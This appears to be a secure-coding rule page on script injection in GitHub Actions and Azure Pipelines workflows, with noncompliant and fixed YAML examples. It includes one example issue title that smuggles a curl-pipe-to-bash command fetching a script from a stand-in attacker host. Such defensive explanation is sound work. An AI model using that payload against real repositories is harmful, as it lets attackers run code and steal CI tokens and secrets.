Why is this an issue?

GitHub evaluates ${{ }} expressions before the shell runs, by pasting their value into the script text. When the value comes from an issue title, a pull request body, a comment, a commit message or a branch name, whoever wrote that text decides what the script contains. A title such as a"; curl -sSfL https://evil.example/x.sh | bash; echo " runs arbitrary commands with the job's GITHUB_TOKEN and secrets.

The same applies to the script input of actions/github-script, where the value becomes JavaScript source.

Azure Pipelines works the same way: $(Build.SourceVersionMessage), $(Build.SourceBranch), $(System.PullRequest.SourceBranch), $(Build.RequestedFor) and their ${{ }}/$[ ] forms are replaced in the script text before script, bash, pwsh, powershell or script tasks run. Commit messages and branch names are chosen by whoever pushes.

How to fix it

Pass the value through an environment variable and reference it as a shell variable, inside double quotes. The shell then treats it as data, never as code.

Noncompliant code example

on: issues
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: echo "New issue: ${{ github.event.issue.title }}"  # Noncompliant

Compliant solution

on: issues
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{ github.event.issue.title }}
        run: echo "New issue: $TITLE"

Noncompliant code example (Azure Pipelines)

steps:
  - bash: echo "Building $(Build.SourceVersionMessage)"  # Noncompliant

Compliant solution (Azure Pipelines)

Every predefined variable is also an environment variable of the step.

steps:
  - bash: echo "Building $BUILD_SOURCEVERSIONMESSAGE"
